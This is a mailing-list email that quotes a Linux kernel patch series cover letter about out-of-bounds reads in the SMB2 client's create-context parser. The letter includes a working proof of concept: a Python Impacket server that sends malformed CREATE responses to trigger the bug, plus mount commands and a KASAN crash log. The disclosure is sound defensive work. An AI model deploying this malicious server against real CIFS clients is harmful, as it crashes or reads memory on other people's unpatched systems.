Received: from mail-lr2-f12.google.com (mail-lr2-f12.google.com [74.125.230.76])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id ED5EA3A1D01
	for <linux-cifs@vger.kernel.org>; Sat, 26 Sep 2026 09:01:40 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.230.76
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790413303; cv=pass; b=oE9GNn7ZhzKOXLUPj9PHqigsnuPCLpm3Vbyefeco+83W5w6COBnzQAIKmz/GJuYYvftyQpEcAPc5C/RC/Do37rcaBns/tTpZyLSezNXKTssJDokM+BGx32LgPWqlj/kuvRXF32e1E98r8SBP4sOhTC8GVHFtcHJeoIdCuFQkJmI=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790413303; c=relaxed/simple;
	bh=4esqkcJScOd1jdRgXhHgN8HEyI9IP1ir1KF4qKKytCg=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=gChp3cHKAytTajIQ5rMBOuNk1gdbRxplu7PwTevNyHyDbf5eJ7kCPzK2a9U5lDhCojumvyswX5r3BG1jAfYB3vwa2rwDUNSBVqot0C1xsqCZR4/vyM9YJp8ARwTm/7oofMczlUof1KoDXVhG946/sx0amNmBxRo1zltVD+K1e5M=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=nKtHf0Ox; arc=pass smtp.client-ip=74.125.230.76
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="nKtHf0Ox"
Received: by mail-lr2-f12.google.com with SMTP id 38308e7fff4ca-3a5b2864f1cso13685641fa.3
        for <linux-cifs@vger.kernel.org>; Sat, 26 Sep 2026 02:01:40 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1790413299; cv=none;
        d=google.com; s=arc-20260327;
        b=JeUf4OnRDtY+nkmMv1KC8b3fXzJ2fSVgCCnmHhi9+WX75qXz7Ds3GL96QCJQj3jQkQ
         zb8T0hSRr19hOqc4iIamTMpRZEHKkYJyZwUpeCAXOZ9OJr2g9sfleONHPJeH8NRkSvPY
         47xVSXg0Z7DeC2pjvuziBdCOq5w0QH3PyPozZAI7Or2JTf+TBoVUjdFPSTnxJEDqOf2p
         J60DmHfv8sRJARDDU1D6YxNXnQEWR2b0T43oMCqxF7JHZYLKMa1v8axoJ+giu9ZbRTPx
         EWQ/MWcekqHjqCOJxy8e6ILerGiahPnRYpbXOuJuqCACNsNRsXqrdjiZtuuklq5QjEke
         g+ew==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=hqBGzuAs7AU36dE/cbidgRXDNFTpOVJmnxZIzihOiis=;
        fh=AqwfB5qnlY8I3NG2A4p4neilcN7u0v2GkRbL34XUsTI=;
        b=IJe8J/BLtJDLXIE2hFzuPvVSL5Eqk+A7foazRhFM+dD9skggyUhJCKlxJUnJOEdyMx
         g8GSprg7HOugOeDX2TrDujUVUEREDMy+LFNQG9fO4O+5ndeg1kMgT4ebaL5X22NfQvqP
         F38WdHqrJcNmgeCse5QMQRbR16iqXcKTuOXnsH/rKEoKbNxXzCMsTkCR3mUTY04mzYqO
         XPY2QXcdGzbb6HxtgZQq/UyYYUy55zpkKHvHyAUYsOF5GXutlL7VwKCdHeWO53fMREms
         HZCfl1PzDEUsvn23f7/Zfwz/KjBY+2Gyhss014CFSjQLA3R3pniaYi7C9Ng0wW0UjBwf
         rdyw==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790413299; x=1791018099; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=hqBGzuAs7AU36dE/cbidgRXDNFTpOVJmnxZIzihOiis=;
        b=nKtHf0OxeeYe605m4kQcHsUesMkjVyemVw9OZzMBI9rrYnDhwE2EPi9V83WeSN4ooT
         NGTqEWUR9aJ67xNlVRhsH9//AKBchutdjtuYajlsrVj6d2CrITE0Sw8TejDSdtKlkg/N
         IN8txgYjbnHCRxIadZ2JKo5Kr4KrVscgACk7OTBX8QfRSGfq7BZt+J1sMPeOLFMAZIMc
         D/lc89eHGWFwk1I8x+mrKra8jiqe22RdrH+W5u2k3ipYgQLcSPegr9CAh4kXezt4MMYF
         E0Olyu1wvWBKgT+X9vCOpuzbWvyT4iYa5sCpx9GHGfWA2Uc0N0k/KSs8Kij9BHMWa36N
         zQQw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790413299; x=1791018099;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=hqBGzuAs7AU36dE/cbidgRXDNFTpOVJmnxZIzihOiis=;
        b=Wsea8JfsRbGvzvaHZzZB/GFUeB6Md8F5Khm8pJTE5wj3ZLghmI/aVOoeInWWIoWHEM
         9K9IH2epO3ysM07MvTWgi2H85nJi3GjdHcf/a+JNBGyPjm86PN32xzSKQgJcBWWikwuF
         JMkg1bzrew5yXG8XpJDtTgmIS73YrsqB2S9lg79ccw3H2gLrsh2nna2zQnd6/WDm8d4N
         CLD6ZTIRuNOivQSkym5zLVO4eX5nXhqQJQA2+hWP/g77SA/ZZrsrp1sN/T1UFdYwr3zO
         G57+HzcJsq1tPRNqrrsBaGVthVnZt7TegXcCxQ/qRC0e8IlmFLZlamYe2KMrb3jSt8aX
         yRoQ==
X-Forwarded-Encrypted: i=1; AKwUvBwhWeWaD2GaJSYBvVNq/0nBRQkGwTxUHoEJEaPvQIbrPn8hRcE+Dw3/T1qLC5agBZty3N5c/LFZ91OR@vger.kernel.org
X-Gm-Message-State: AFuF++naZxCPL1/VRYDosnZU/5gQCjjqRqVL7sRtd33fzdp5jGZiRDc9
	GItFOV/EjdOw1OEE+DBqRqyuooTY2ifZ0hq7CqLtMM4D0q5sy6BTXHN3l35fVCQ6YciXEILaxgw
	npnAj2DJcP8BalvS/tzjPrqClzWrHA3k0U7ZKpLaqpo8=
X-Gm-Gg: AYBFou1UZZExytLSRZJcO2e55ETY7ul6UCKh7S3/tXHVifdS5B6q1JsqD9qF29b6uZE
	SF+mly6tR8TZHRq0HRVFhI7d7N25eQ3yf65qX74XsQcE9uO23F/Y5+E1NDlcodXzHBvFIuhj6Yg
	Xj7RHC9PgG0AJcsUUUb7bLtLTuBj/YgnrPTuiHT1VCqEl/q5JuChKJSkeBrPt02wp9m49rci+WW
	DsxtSRbcwGa2Slm1AqUJhGEQEcIePmPa+MxAFBEEoTZ4/MUvxJzpd9w/aJa4fPTt0e9eXKpGfLN
	JL6Vyz1Amnn//Giykg4lKe63aU5B9ZYa9VIShpBTNjnQIPYaA33tJPVZZ8FWTgf26d0c/qJoLPE
	LE3VuncdQig==
X-Received: by 2002:a05:651c:41ca:b0:3a3:7682:499e with SMTP id
 38308e7fff4ca-3a63c0f820emr23541221fa.19.1790413298524; Sat, 26 Sep 2026
 02:01:38 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <cover.1790398755.git.zihanx@nebusec.ai> <CAANe3eRw6ySzMQJP2g=vBXfZeNqWNW8eX5vTmzp5bxfaA8+9bA@mail.gmail.com>
In-Reply-To: <CAANe3eRw6ySzMQJP2g=vBXfZeNqWNW8eX5vTmzp5bxfaA8+9bA@mail.gmail.com>
From: zihan xi <zihanx@nebusec.ai>
Date: Sat, 26 Sep 2026 17:01:29 +0800
X-Gm-Features: AclHuK_g6MPuyqceUeLfhsN8X2W7BLxaN0wrwJQna5JyXlkfCRBrssgGIdr7nQM
Message-ID: <CAANe3eQvFiDwUA3A+z=2Z6q8VRgjxtbS7B3uiwKi+stj7Awkmg@mail.gmail.com>
Subject: Re: [PATCH v5 0/6] smb: client: fix create context out-of-bounds reads
To: Paulo Alcantara <pc@manguebit.org>
Cc: ronniesahlberg@gmail.com, sprasad@microsoft.com, tom@talpey.com, 
	bharathsm@microsoft.com, pshilovsky@samba.org, aaptel@suse.com, 
	pali@kernel.org, linux-cifs@vger.kernel.org, samba-technical@lists.samba.org, 
	linux-kernel@vger.kernel.org, stable@vger.kernel.org, 
	Namjae Jeon <linkinjeon@kernel.org>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Sat, Sep 26, 2026 at 3:01=E2=80=AFPM zihan xi <zihanx@nebusec.ai> wrote:
>
> On Sat, Sep 26, 2026 at 2:49=E2=80=AFPM Zihan Xi <zihanx@nebusec.ai> wrot=
e:
> >
> > Hi Linux kernel maintainers,
> >
> > We found and validated an issue in fs/smb/client/smb2pdu.c. A malicious
> > SMB server can send a malformed SMB2 CREATE response to a CIFS client a=
nd
> > trigger an out-of-bounds read. We validated this with an Impacket serve=
r on
> > the QEMU host and a root CIFS client in the guest; CIFS does not set
> > FS_USERNS_MOUNT, so the mount must run as root. For valid SMB responses=
,
> > the series preserves existing request handling. No impact was observed =
in
> > the tested CIFS mount/read path; a full filesystem regression suite was=
 not
> > run.
> >
> > We will provide detailed information about the bug
> > in this email, along with a PoC to trigger it.
> >
> > ---- details below ----
> >
> > Bug details:
> >
> > smb2_parse_contexts() validates the complete create-context area but do=
es
> > not limit each context record to its Next field before dispatching it. =
A
> > malformed chain can therefore allow a handler to read bytes beyond the
> > current context. The QFid handler also cast the context to a full respo=
nse
> > structure without verifying that DataLength covered DiskFileId, so a
> > truncated QFid context could read past the response allocation. A
> > non-terminal Next that does not leave a complete following context head=
er
> > is rejected as malformed.
> >
> > The parser rejects NameOffset and DataOffset values before the context
> > header, bounds the name range by the current record with checked arithm=
etic,
> > and dispatches known handlers only when DataLength is non-zero.
> >
> > The SMB2/SMB3 lease parsers also read LeaseState and LeaseFlags at
> > canonical offsets rather than from DataOffset. Patch 1 limits each reco=
rd
> > to Next, reads QFid data only when its payload covers DiskFileId, and
> > parses lease data from DataOffset with the exact v1/v2 lease payload si=
zes.
> > A size mismatch skips lease parsing without failing the open. These siz=
es
> > match the fixed payload sizes used by the CIFS request builders and
> > ksmbd; a future extension must update the parser explicitly.
> >
> > parse_posix_ctxt() reads nlink, reparse_tag, and mode before checking t=
hat
> > the POSIX data contains them. The in-tree smb2_open_file() path passes =
a
> > NULL posix pointer, so ordinary opens do not reach this handler. Patch =
2
> > still checks the handler's minimum data length and preserves soft failu=
re
> > for malformed optional metadata.
> >
> > Tracing the parser callers and compound error paths through cleanup and
> > return-value handling also exposed the additional independent issues fi=
xed
> > by patches 3 through 6.
> >
> > After a successful CREATE, SMB2_open() increments num_remote_opens befo=
re
> > parsing its contexts. Patch 3 calls SMB2_close() after a parsing failur=
e.
> > SMB2_close() decrements num_remote_opens only after a confirmed success=
ful
> > close response. If a close is interrupted or transport fails, the exist=
ing
> > best-effort behavior retains conservative accounting when the remote re=
sult
> > is unknown.
> >
> > open_cached_dir() sends CREATE and QUERY_INFO as a compound request. Pa=
tch
> > 4 validates the CREATE response before using its fields, records the CR=
EATE
> > FIDs, marks the handle open, and increments the remote-open count befor=
e
> > processing later-command errors. It also handles -EREMCHG before respon=
se
> > validation, so a missing response does not hide the reconnect request.
> > Patch 5 marks earlier completed mids as cancelled when a later compound
> > wait is interrupted or MID synchronization or state validation fails. I=
t
> > keeps their response buffers attached until synchronization is complete=
, so
> > the existing cancelled-mid cleanup can inspect each successful CREATE a=
nd
> > queue SMB2_close(). The remote-open count is incremented only after clo=
se
> > work allocation succeeds and before queueing it, so an OOM does not lea=
ve
> > an unmatched count. It marks smb2_unlink()'s create+close compound so i=
t
> > is not closed again. Non-CREATE responses and compounds with a close ke=
ep
> > their existing behavior.
> >
> > Patch 6 preserves a create-context parsing error in the
> > SMB2_OP_OPEN_QUERY compound path while later responses are processed.
> >
> > The series keeps separate Fixes tags for the independent root causes, w=
ith
> > each tag pointing to the earliest commit that introduced its root cause=
.
> >
> > The parser changes overlap with Frank Sorenson's related bounds-checkin=
g
> > patch for smb2_parse_contexts():
> > https://lore.kernel.org/all/20260826153147.4112943-12-sorenson@redhat.c=
om/
> > This series incorporates the NameOffset, Next, and zero-data dispatch c=
hecks
> > while retaining the stricter per-record successor-header validation and=
 the
> > handler-specific payload checks.
> >
> > The reproducer uses an Impacket SMB server that modifies the SMB2 CREAT=
E
> > response. packetdrill is not used because it cannot implement the requi=
red
> > stateful SMB server or rewrite this response.
> >
> > Reproducer:
> >
> > From the PoC directory:
> >
> >     gcc -O2 -static -o poc poc.c
> >     chmod +x poc.sh
> >     ./poc
> >
> > The wrapper starts the Impacket server on the host at tcp/4445. The
> > validation uses QEMU user-mode networking (`-netdev user`), so no
> > additional veth, network namespace, or TCP proxy is needed. Configure t=
he
> > guest interface and route as follows:
> >
> >     ip link set eth0 up
> >     ip addr add 10.0.2.15/24 dev eth0
> >     ip route add default via 10.0.2.2
> >
> > Then, as root in the guest, mount the share and read the trigger file:
> >
> >     mkdir -p /mnt/test
> >     mount -t cifs //10.0.2.2/SHARE /mnt/test \
> >         -o user=3D,password=3D,vers=3D2.0,sec=3Dntlmssp,port=3D4445,nop=
erm,soft
> >     cat /mnt/test/probe >/dev/null
> >
> > The C wrapper execs ./poc.sh, so poc.sh must retain its executable bit =
(or
> > be made executable with chmod +x as shown). On first use, the wrapper
> > creates a virtual environment and installs Impacket 0.13.1. The initial
> > setup requires network access to the configured package index; an exist=
ing
> > virtual environment needs no installation.
> > The guest-side mount is shown separately because CIFS does not set
> > FS_USERNS_MOUNT; the validated mount/read commands run as root in the
> > guest.
> >
> > We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
> > ------BEGIN poc.c------
> > #include <stdio.h>
> > #include <unistd.h>
> >
> > int main(int argc, char **argv)
> > {
> >         (void)argc;
> >         argv[0] =3D "./poc.sh";
> >         execv(argv[0], argv);
> >         perror("execv ./poc.sh");
> >         return 127;
> > }
> > ------END poc.c--------
> >
> > ------BEGIN poc.sh------
> > #!/bin/bash
> > set -euo pipefail
> >
> > SCRIPT_DIR=3D$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
> > VENV_DIR=3D"$SCRIPT_DIR/.venv-impacket"
> >
> > if [[ ! -x "$VENV_DIR/bin/python" ]]; then
> >     python3 -m venv "$VENV_DIR"
> >     "$VENV_DIR/bin/pip" install impacket=3D=3D0.13.1
> > fi
> >
> > exec "$VENV_DIR/bin/python" "$SCRIPT_DIR/poc.py" "$@"
> > ------END poc.sh--------
> >
> > ------BEGIN poc.py------
> > #!/usr/bin/env python3
> > import logging
> > import signal
> > import struct
> > from pathlib import Path
> >
> > from impacket import smbserver
> > from impacket import smb3structs as smb2
> > from impacket.nt_errors import STATUS_SUCCESS
> >
> >
> > PORT =3D 4445
> > SHARE_NAME =3D "SHARE"
> > TARGET_NAME =3D "probe"
> > TARGET_OFFSET =3D 424
> > CONTEXT =3D struct.pack("<IHHHHI4s4x", 0, 16, 4, 0, 24, 0, b"QFid")
> > ALIGN_PAD =3D b"\x00" * (TARGET_OFFSET - 152)
> >
> >
> > def prepare_share(share_dir: Path) -> None:
> >     share_dir.mkdir(parents=3DTrue, exist_ok=3DTrue)
> >     (share_dir / "placeholder").touch()
> >     (share_dir / TARGET_NAME).write_bytes(b"x")
> >
> >
> > def main() -> None:
> >     base_dir =3D Path(__file__).resolve().parent
> >     share_dir =3D base_dir / "share"
> >     prepare_share(share_dir)
> >
> >     logging.basicConfig(level=3Dlogging.INFO, format=3D"%(levelname)s:%=
(message)s")
> >
> >     original =3D smbserver.SMB2Commands.smb2Create
> >
> >     def malicious_smb2_create(conn_id, smb_server, recv_packet):
> >         req =3D smb2.SMB2Create(recv_packet["Data"])
> >         raw_name =3D req["Buffer"][: req["NameLength"]]
> >         name =3D smbserver.normalize_path(raw_name.decode("utf-16le"))
> >
> >         commands, packets, error =3D original(conn_id, smb_server, recv=
_packet)
> >         print(f"CREATE name=3D{name!r} err=3D0x{error:08x}", flush=3DTr=
ue)
> >
> >         if error =3D=3D STATUS_SUCCESS and name =3D=3D TARGET_NAME:
> >             resp =3D commands[0]
> >             resp["CreateContextsOffset"] =3D TARGET_OFFSET
> >             resp["CreateContextsLength"] =3D len(CONTEXT)
> >             resp["AlignPad"] =3D ALIGN_PAD
> >             resp["Buffer"] =3D CONTEXT
> >             print(
> >                 f"injected truncated QFid context; packet_len=3D{64 + l=
en(resp.getData())}",
> >                 flush=3DTrue,
> >             )
> >
> >         return commands, packets, error
> >
> >     smbserver.SMB2Commands.smb2Create =3D staticmethod(malicious_smb2_c=
reate)
> >
> >     server =3D smbserver.SimpleSMBServer(listenAddress=3D"0.0.0.0", lis=
tenPort=3DPORT)
> >     server.setSMB2Support(True)
> >     server.addShare(SHARE_NAME, str(share_dir), readOnly=3D"yes")
> >     server.setLogFile("/dev/stdout")
> >
> >     print(f"Serving //10.0.2.2/{SHARE_NAME} on tcp/{PORT}", flush=3DTru=
e)
> >     print("Trigger file: probe", flush=3DTrue)
> >
> >     signal.signal(signal.SIGTERM, lambda _sig, _frame: (_ for _ in ()).=
throw(SystemExit(0)))
> >     try:
> >         server.start()
> >     except (KeyboardInterrupt, SystemExit):
> >         pass
> >
> >
> > if __name__ =3D=3D "__main__":
> >     main()
> > ------END poc.py--------
> >
> > The following excerpt is from the output of
> > scripts/decode_stacktrace.sh when run on the unpatched baseline log. Th=
e
> > command used was:
> >
> >     ./scripts/decode_stacktrace.sh vmlinux source-tree < baseline.log
> >
> > The excerpt below is the resulting output.
> > ----BEGIN crash log----
> > [ 1344.780735] [  T11242] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D
> > [ 1344.780750] [  T11242] BUG: KASAN: slab-out-of-bounds in smb2_parse_=
contexts (fs/smb/client/smb2pdu.c:3337)
> > [ 1344.780838] [  T11242] Read of size 8 at addr ff1100007e4b3180 by ta=
sk cat/11242
> >
> > [ 1344.780880] [  T11242] CPU: 0 UID: 0 PID: 11242 Comm: cat Not tainte=
d 7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
> > [ 1344.780887] [  T11242] Hardware name: QEMU Ubuntu 24.04 PC (i440FX +=
 PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> > [ 1344.780907] [  T11242] Call Trace:
> > [ 1344.780918] [  T11242]  <TASK>
> > [ 1344.780925] [  T11242]  dump_stack_lvl (lib/dump_stack.c:88)
> > [ 1344.780980] [  T11242]  print_report (mm/kasan/report.c:288 (discrim=
inator 1) mm/kasan/report.c:376 (discriminator 1) mm/kasan/report.c:482 (di=
scriminator 1))
> > [ 1344.781004] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu=
.c:3337)
> > [ 1344.781009] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781030] [  T11242]  ? __virt_addr_valid (arch/x86/mm/physaddr.c:=
55)
> > [ 1344.781052] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu=
.c:3337)
> > [ 1344.781057] [  T11242]  kasan_report (mm/kasan/report.c:640)
> > [ 1344.781065] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu=
.c:3337)
> > [ 1344.781077] [  T11242]  smb2_parse_contexts (fs/smb/client/smb2pdu.c=
:3337)
> > [ 1344.781085] [  T11242]  ? _raw_spin_unlock (include/asm-generic/qspi=
nlock.h:128 (discriminator 4) include/linux/spinlock.h:205 (discriminator 4=
) include/linux/spinlock_api_smp.h:168 (discriminator 4) kernel/locking/spi=
nlock.c:190 (discriminator 4))
> > [ 1344.781101] [  T11242]  SMB2_open (fs/smb/client/smb2pdu.c:3344)
> > [ 1344.781107] [  T11242]  ? cifsConvertToUTF16 (fs/smb/client/cifs_uni=
code.c:419 fs/smb/client/cifs_unicode.c:491)
> > [ 1344.781129] [  T11242]  ? __pfx_SMB2_open+0x10/0x10
> > [ 1344.781135] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781139] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781145] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781149] [  T11242]  ? __kmalloc_noprof (arch/x86/include/asm/ato=
mic.h:23 include/linux/atomic/atomic-arch-fallback.h:457 include/linux/jump=
_label.h:248 mm/slab.h:458 mm/slub.c:4558 mm/slub.c:5392)
> > [ 1344.781164] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781167] [  T11242]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_=
unicode.c:628)
> > [ 1344.781184] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781206] [  T11242]  ? cifs_convert_path_to_utf16 (fs/smb/client/=
smb2misc.c:457)
> > [ 1344.781211] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781216] [  T11242]  ? __pfx_cifs_convert_path_to_utf16+0x10/0x10
> > [ 1344.781226] [  T11242]  ? smb2_open_file (fs/smb/client/smb2file.c:1=
84)
> > [ 1344.781231] [  T11242]  smb2_open_file (fs/smb/client/smb2file.c:184=
)
> > [ 1344.781242] [  T11242]  ? __pfx_smb2_open_file+0x10/0x10
> > [ 1344.781247] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781250] [  T11242]  ? __lock_acquire+0x45c/0x25f0
> > [ 1344.781278] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781291] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781295] [  T11242]  ? __asan_memcpy (mm/kasan/shadow.c:105 (disc=
riminator 1))
> > [ 1344.781316] [  T11242]  cifs_open (fs/smb/client/file.c:1155 (discri=
minator 2))
> > [ 1344.781354] [  T11242]  ? __pfx_cifs_open+0x10/0x10
> > [ 1344.781359] [  T11242]  ? do_sys_openat2 (include/linux/file.h:164 f=
s/open.c:1364)
> > [ 1344.781373] [  T11242]  ? do_syscall_64 (include/linux/irq-entry-com=
mon.h:207 include/linux/irq-entry-common.h:238 include/linux/entry-common.h=
:328 arch/x86/entry/syscall_64.c:100)
> > [ 1344.781409] [  T11242]  ? kasan_quarantine_put (arch/x86/include/asm=
/irqflags.h:158 (discriminator 1) mm/kasan/quarantine.c:234 (discriminator =
1))
> > [ 1344.781413] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781417] [  T11242]  ? lockdep_hardirqs_on+0x7b/0x110
> > [ 1344.781463] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781469] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781485] [  T11242]  ? bpf_trampoline_6442634119+0x9f/0xed
> > [ 1344.781503] [  T11242]  ? do_dentry_open (fs/open.c:915)
> > [ 1344.781510] [  T11242]  do_dentry_open (fs/open.c:915)
> > [ 1344.781515] [  T11242]  ? __pfx_cifs_open+0x10/0x10
> > [ 1344.781521] [  T11242]  ? cifs_permission (fs/smb/client/cifsfs.c:43=
2 (discriminator 1))
> > [ 1344.781537] [  T11242]  vfs_open (fs/open.c:1098)
> > [ 1344.781541] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781549] [  T11242]  path_openat (fs/namei.c:5179)
> > [ 1344.781572] [  T11242]  ? __pfx_path_openat+0x10/0x10
> > [ 1344.781581] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781584] [  T11242]  ? __lock_acquire+0x45c/0x25f0
> > [ 1344.781594] [  T11242]  do_file_open (fs/namei.c:4901)
> > [ 1344.781601] [  T11242]  ? __pfx_do_file_open+0x10/0x10
> > [ 1344.781606] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781627] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781631] [  T11242]  ? alloc_fd (fs/file.c:1297)
> > [ 1344.781651] [  T11242]  ? do_getname+0x6b/0x2d0
> > [ 1344.781658] [  T11242]  do_sys_openat2 (include/linux/file.h:164 fs/=
open.c:1364)
> > [ 1344.781663] [  T11242]  ? __pfx_do_sys_openat2+0x10/0x10
> > [ 1344.781666] [  T11242]  ? __pfx___do_sys_newfstat+0x10/0x10
> > [ 1344.781683] [  T11242]  __x64_sys_openat (fs/open.c:1389)
> > [ 1344.781691] [  T11242]  ? __pfx___x64_sys_openat+0x10/0x10
> > [ 1344.781698] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781702] [  T11242]  ? rcu_is_watching (include/linux/context_tra=
cking.h:128 kernel/rcu/tree.c:752)
> > [ 1344.781713] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/=
asm/nospec-branch.h:381)
> > [ 1344.781717] [  T11242]  ? do_syscall_64 (arch/x86/entry/syscall_64.c=
:63 arch/x86/entry/syscall_64.c:94)
> > [ 1344.781723] [  T11242]  do_syscall_64 (include/linux/irq-entry-commo=
n.h:207 include/linux/irq-entry-common.h:238 include/linux/entry-common.h:3=
28 arch/x86/entry/syscall_64.c:100)
> > [ 1344.781728] [  T11242]  ? irqentry_exit (include/linux/irq-entry-com=
mon.h:507 include/linux/irq-entry-common.h:550 kernel/entry/common.c:164)
> > [ 1344.781735] [  T11242]  entry_SYSCALL_64_after_hwframe (arch/x86/ent=
ry/entry_64.S:150)
> > [ 1344.781740] [  T11242] RIP: 0033:0x7fc594192687
> > [ 1344.781757] [  T11242] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 =
08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 =
24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff f=
f ff
> > All code
> > =3D=3D=3D=3D=3D=3D=3D=3D
> >    0:   48 89 fa                mov    %rdi,%rdx
> >    3:   4c 89 df                mov    %r11,%rdi
> >    6:   e8 58 b3 00 00          call   0xb363
> >    b:   8b 93 08 03 00 00       mov    0x308(%rbx),%edx
> >   11:   59                      pop    %rcx
> >   12:   5e                      pop    %rsi
> >   13:   48 83 f8 fc             cmp    $0xfffffffffffffffc,%rax
> >   17:   74 1a                   je     0x33
> >   19:   5b                      pop    %rbx
> >   1a:   c3                      ret
> >   1b:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
> >   22:   00
> >   23:   48 8b 44 24 10          mov    0x10(%rsp),%rax
> >   28:   0f 05                   syscall
> >   2a:*  5b                      pop    %rbx             <-- trapping in=
struction
> >   2b:   c3                      ret
> >   2c:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
> >   33:   83 e2 39                and    $0x39,%edx
> >   36:   83 fa 08                cmp    $0x8,%edx
> >   39:   75 de                   jne    0x19
> >   3b:   e8 23 ff ff ff          call   0xffffffffffffff63
> >
> > Code starting with the faulting instruction
> > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> >    0:   5b                      pop    %rbx
> >    1:   c3                      ret
> >    2:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
> >    9:   83 e2 39                and    $0x39,%edx
> >    c:   83 fa 08                cmp    $0x8,%edx
> >    f:   75 de                   jne    0xffffffffffffffef
> >   11:   e8 23 ff ff ff          call   0xffffffffffffff39
> > [ 1344.781761] [  T11242] RSP: 002b:00007ffc7d27b080 EFLAGS: 00000202 O=
RIG_RAX: 0000000000000101
